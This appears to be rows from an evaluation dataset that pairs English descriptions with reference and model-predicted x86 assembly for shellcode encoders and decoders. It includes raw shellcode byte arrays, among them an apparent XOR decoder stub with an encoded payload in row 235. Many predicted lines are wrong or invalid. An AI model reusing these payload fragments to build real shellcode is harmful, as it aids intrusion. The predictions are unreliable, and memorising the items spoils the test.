233,"shellcode is array of bytes 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa","shellcode : db 0xbb , 0xec , 0x73 , 0xcc , 0x3f , 0x9d , 0xbb , 0x8d , 0x51 , 0xbb , 0xb5 , 0x1b , 0xbb , 0xb3 , 0x22 , 0xbb , 0xf2 , 0x79 , 0xbb , 0xae , 0x8e , 0xbb , 0xb5 , 0x61 , 0xbb , 0xb5 , 0x3d , 0xbb , 0xf2 , 0x6e , 0xbb , 0xf2 , 0x9f , 0xbb , 0xbf , 0x10 , 0xbb , 0xb4 , 0x89 , 0xcc , 0x76 , 0x2d , 0xcc , 0x1c , 0x2f , 0xbb , 0x8d , 0x91 , 0xcc , 0x76 , 0x7e , 0xcc , 0x1d , 0x92 , 0xbb , 0x8e , 0x80 , 0xcc , 0x76 , 0x7b , 0xcc , 0x1e , 0xa7 , 0xcc , 0x4f , 0x7f , 0xbb , 0xd6 , 0x2b , 0xcc , 0x32 , 0x24 , 0xcc , 0x7f , 0x37 , 0xaa","pop 0xbb , 0xec , 0x73 , 0xcc , 0x3f , 0x9d , 0xbb , 0x8d , 0x51 , 0xbb , 0xb5 , 0x1b , 0xbb , 0xb3 , 0x22 , 0xbb , 0xf2 , 0x79 , 0xbb , 0xae , 0x8e , 0xbb , 0xb5 , 0x61 , 0xbb , 0xb5 , 0x3d , 0xbb , 0xf2 , 0x6e , 0xbb , 0xf2 , 0x9f , 0xbb , 0xbf , 0x10 , 0xbb , 0xb4 , 0x89 , 0xcc , 0x76 , 0x2d , 0xcc , 0x1c , 0x2f , 0xbb , 0x8d , 0x91 , 0xcc , 0x76 , 0x7e , 0xcc , 0x1d , 0x92 , 0xbb , 0x8e , 0x80 , 0xcc , 0x76 , 0x7b , 0xcc , 0x1e , 0xa7 , 0xcc , 0x4f , 0x7f , 0xbb , 0xd6 , 0x2b , 0xcc , 0x32 , 0x24 , 0xcc , 0x7f , 0x37 , 0xaa"
234,"shellcode is an array of bytes 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb","shellcode : db 0xc6 , 0x02 , 0x80 , 0x01 , 0x81 , 0x03 , 0xd1 , 0x01 , 0xbe , 0x02 , 0x5f , 0x01 , 0x98 , 0x03 , 0x1c , 0x06 , 0x60 , 0x08 , 0xf6 , 0x04 , 0xc5 , 0x01 , 0x92 , 0x04 , 0x30 , 0x07 , 0x64 , 0x06 , 0x3a , 0x04 , 0x58 , 0x08 , 0x4f , 0x03 , 0x59 , 0x05 , 0xd2 , 0x06 , 0x81 , 0x08 , 0x1a , 0x04 , 0x5f , 0x07 , 0x03 , 0x08 , 0xd8 , 0x04 , 0x0c , 0x04 , 0xbb , 0xbb","pop 0xc6 , 0x02 , 0x80 , 0x01 , 0x81 , 0x03 , 0xd1 , 0x01 , 0xbe , 0x02 , 0x5f , 0x01 , 0x98 , 0x03 , 0x1c , 0x06 , 0x60 , 0x08 , 0xf6 , 0x04 , 0xc5 , 0x01 , 0x92 , 0x04 , 0x30 , 0x07 , 0x64 , 0x06 , 0x3a , 0x04 , 0x58 , 0x08 , 0x4f , 0x03 , 0x59 , 0x05 , 0xd2 , 0x06 , 0x81 , 0x08 , 0x1a , 0x04 , 0x5f , 0x07 , 0x03 , 0x08 , 0xd8 , 0x04 , 0x0c , 0x04 , 0xbb , 0xbb"
235,"define the array of bytes shellcode and initialize it to 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a","shellcode : db 0xeb , 0x0d , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0x80 , 0x36 , 0xaa , 0x46 , 0xe2 , 0xfa , 0xeb , 0x05 , 0xe8 , 0xee , 0xff , 0xff , 0xff , 0x9b , 0x6a , 0xfa , 0xc2 , 0x85 , 0x85 , 0xd9 , 0xc2 , 0xc2 , 0x85 , 0xc8 , 0xc3 , 0xc4 , 0x23 , 0x49 , 0xfa , 0x23 , 0x48 , 0xf9 , 0x23 , 0x4b , 0x1a , 0xa1 , 0x67 , 0x2a","db 0xeb , 0x0d , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0x80 , 0x36 , 0xaa , 0x46 , 0xe2 , 0xfa , 0xeb , 0x05 , 0xe8 , 0xee , 0xff , 0xff , 0xff , 0x9b , 0x6a , 0xfa , 0xc2 , 0x85 , 0x85 , 0xd9 , 0xc2 , 0xc2 , 0x85 , 0xc8 , 0xc3 , 0xc4 , 0x23 , 0x49 , 0xfa , 0x23 , 0x48 , 0xf9 , 0x23 , 0x4b , 0x1a , 0xa1 , 0x67 , 0x2a"
238,shift left 28 bits of eax,"shl eax , 28","sar eax , 28"
239,shift left the eax register by 28 bits,"shl eax , 28","sar eax , 31"
243,shift right dl by 1,"shr dl , 1","shr var0 , 1"
244,shift right the dl register by 4 bits,"shr dl , 4","shr var0 , dl"
247,define stage and call decoder function,stage : \ n call decoder,call decoder
249,subtract the contents of al from the bl register,"sub bl , al","sub al , bl"
250,subtract the current byte of the shellcode from bl,"sub bl , byte [ esi ]","sub byte [ esi ] , bl"
252,subtract the contents of dl from the cl register,"sub cl , dl","sub dl , cl"
253,subtract al from dl and jump to decode_pr if the sign flag is zero,"sub dl , al \ n jns decode_pr","sub dl , byte [ decode_pr ]"
255,subtract 0x7f from the stack,"sub esp , 0x7f","sub 0x7f , 0x7f"
258,jump to even_number is the contents in esi is even,"test esi , 01h \ n je even_number",jmp esi
259,swap al value with next byte value (esi+1),"xchg byte [ esi + 1 ] , al","xor al , esi + 1 \ n inc al"
260,perform xor between al and bl and jump short to shellcode if the result is zero,"xor al , bl \ n jz short shellcode","xor al , bl \ n jz short var2"
263,perform xor between ax and bx and jump to call decoded if the result is zero,"xor ax , bx \ n jz call_decoded","xor ax , bx \ n jz var1"
264,perform the xor between bh and the byte in esi+edx,"xor bh , byte [ esi + edx ]","xor byte [ esi + edx ] , al"
265,perform xor between bl and 0xaa and jump to encodedshellcode if the result is not zero,"xor bl , 0xaa \ n jne encodedshellcode","xor bl , 0xaa \ n jnz encodedshellcode"
266,perform xor between bl and 0xbb and jump to encoded if the result is zero,"xor bl , 0xbb \ n jz encoded","xor bl , 0xbb \ n jz var2"
267,perform the xor between bl and 0xbb and jump to formatting if it is zero else move the byte of the shellcode in cl,"xor bl , 0xbb \ n jz formatting \ n mov cl , byte [ esi ]","xor bl , bl \ n cmp byte [ esi ]"
268,perform the xor between bl and the byte in esi+edx,"xor bl , byte [ esi + edx ]","xor bl , bl"
269,perform xor between bl and dl and jump short to shellcode if the result is not zero,"xor bl , dl \ n jz short shellcode","xor dl , bl \ n jnz short var1"
270,xor between the current byte in esi and 0x88,"xor byte [ esi ] , 0x88","xor esi , 0x88 \ n xor byte [ 0x88 ]"
271,xor between current byte in esi and 0x97,"xor byte [ esi ] , 0x97","xor esi , 0x97 \ n xor byte [ 0x97 ]"
272,perform the xor between the current byte of the shellcode and the dl register,"xor byte [ esi ] , dl","xor dl , byte [ esi ]"
273,perform the xor between the byte in esi and dl,"xor byte [ esi ] , dl","xor esi , esi"
274,perform the xor between the current byte in esi and dl,"xor byte [ esi ] , dl","xor esi , esi"
275,perform the xor between the next byte of the shellcode and the dl register,"xor byte [ esi + 1 ] , dl","xor dl , [ esi + 1 ]"
276,perform the xor between ch and the byte in esi+edx,"xor ch , byte [ esi + edx ]","xor ch , ch"
277,perform xor between cl and 0x32 and jump short to encodedshellcode is the result is zero,"xor cl , 0x32 \ n je short encodedshellcode","xor cl , encodedshellcode \ n jz short 0x32"
279,perform xor between cl and 0xaa and jump to shift decode if the result is zero,"xor cl , 0xaa \ n jz shift_decode","xor cl , 0xaa \ n jz cl"
280,perform the xor between cl and the byte in esi+edx,"xor cl , byte [ esi + edx ]","xor cl , esi + edx"
282,clear the eax register and move 0x1 in the lowest byte of the register,"xor eax , eax \ n mov al , 0x1","xor eax , eax \ n mov cl , 0x1"
283,clear the eax register and move 22 into the lower byte of the register,"xor eax , eax \ n mov al , 22","xor eax , eax \ n mov dl , 20"
284,clear the eax and the ebx registers,"xor eax , eax \ n xor ebx , ebx","xor ebx , ebx \ n mul ebx"
291,clear the ebx and edx registers,"xor ebx , ebx \ n xor edx , edx","xor ebx , ebx \ n mul ebx"
293,zero out the ecx register and move 0x19 into the lower byte of the register,"xor ecx , ecx \ n mov cl , 0x19","xor ecx , ecx \ n mov bl , 0x19"
294,clear the counter and move 0x1e into the first byte of the register,"xor ecx , ecx \ n mov cl , 0x1e","xor 0x1e , 0x1e \ n mov bl , var1"
295,zero out the ecx register and move 23 into the lower byte of the register,"xor ecx , ecx \ n mov cl , 23","xor ecx , ecx \ n mov al , 23"
296,zero out the ecx register and move 25 in the lower 8 bits of the register,"xor ecx , ecx \ n mov cl , 25","xor ecx , ecx \ n mov bl , 25"
297,zero out the loop counter and move shellcode_length in the first byte,"xor ecx , ecx \ n mov cl , shellcode_length","xor shellcode_length , shellcode_length \ n mov bl , shellcode_length"
299,cause both eax and edx to become zero,"xor ecx , ecx \ n mul ecx","xor edx , edx"
300,zero out eax and edx registers,"xor ecx , ecx \ n mul ecx","xor edx , edx \ n mul edx"
301,clear ecx and eax,"xor ecx , ecx \ n mul ecx","xor ebx , ebx \ n mul ebx"
303,clear the edx register and move the current byte of the shellcode into the lowest byte of the register,"xor edx , edx \ n mov dl , [ esi ]","xor edx , edx \ n mov bl , [ esi + 1 ]"
